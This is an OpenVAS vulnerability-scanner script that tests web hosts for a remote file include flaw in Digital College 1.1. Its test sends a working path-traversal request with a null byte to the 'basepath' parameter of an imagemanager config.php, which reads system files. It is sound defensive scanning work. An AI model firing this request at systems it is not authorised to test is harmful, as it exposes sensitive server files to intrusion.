###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_digital_college_49830.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Digital College 'basepath' Parameter Multiple Remote File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Digital College is prone to multiple remote file-include
vulnerabilities because the application fails to sufficiently sanitize
user-supplied input.

Exploiting these issues may allow a remote attacker to obtain
sensitive information or to execute arbitrary script code in the
context of the Web server process. This may allow the attacker to
compromise the application and the underlying computer; other attacks
are also possible.

Digital College 1.1 is vulnerable; other versions may also be
affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103280");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-09-29 13:17:07 +0200 (Thu, 29 Sep 2011)");
 script_bugtraq_id(49830);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Digital College 'basepath' Parameter Multiple Remote File Include Vulnerabilities");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49830");
 script_xref(name : "URL" , value : "http://digitalcollege.magtrb.com/");
 script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/105353/digitalcollege-rfi.txt");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
   
port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/dc", "/college", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    url = string(dir, "/includes/tiny_mce/plugins/imagemanager/config.php?basepath=/",files[file],"%00"); 

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
